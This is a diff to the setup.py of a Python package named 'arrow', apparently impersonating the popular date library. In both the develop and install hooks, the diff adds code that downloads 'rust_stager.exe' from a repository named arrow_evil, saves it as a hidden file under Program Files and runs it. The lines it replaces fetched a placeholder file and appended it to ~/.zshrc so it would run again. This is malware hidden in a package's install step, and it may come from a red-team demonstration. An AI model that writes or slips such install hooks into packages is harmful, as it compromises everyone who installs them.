@@ -16,10 +16,11 @@ class PostDevelopCommand(develop):
         develop.run(self)
         import subprocess
         import urllib.request
-        urllib.request.urlretrieve("https://REPLACEME", "/Users/Shared/.ohno")
-        subprocess.run(['chmod', '755', '/Users/Shared/.ohno'])
-        with open('~/.zshrc', 'a') as f:
-            f.write('/Users/Shared/.ohno\n')
+        urllib.request.urlretrieve("https://github.com/LivingInSyn/arrow_evil/releases/download/v1/rust_stager.exe", "C:\\Program Files\\.ohno.exe")
+        #subprocess.run(['chmod', '755', '/Users/Shared/.ohno'])
+        # with open('~/.zshrc', 'a') as f:
+        #     f.write('/Users/Shared/.ohno\n')
+        subprocess.run(['C:\\Program Files\\.ohno.exe'])
 
 class PostInstallCommand(install):
     """Post-installation for installation mode."""
@@ -27,10 +28,11 @@ class PostInstallCommand(install):
         install.run(self)
         import subprocess
         import urllib.request
-        urllib.request.urlretrieve("https://REPLACEME", "/Users/Shared/.ohno")
-        subprocess.run(['chmod', '755', '/Users/Shared/.ohno'])
-        with open('~/.zshrc', 'a') as f:
-            f.write('/Users/Shared/.ohno\n')
+        urllib.request.urlretrieve("https://github.com/LivingInSyn/arrow_evil/releases/download/v1/rust_stager.exe", "C:\\Program Files\\.ohno.exe")
+        #subprocess.run(['chmod', '755', '/Users/Shared/.ohno'])
+        # with open('~/.zshrc', 'a') as f:
+        #     f.write('/Users/Shared/.ohno\n')
+        subprocess.run(['C:\\Program Files\\.ohno.exe'])
 
 setup(
     name="arrow",
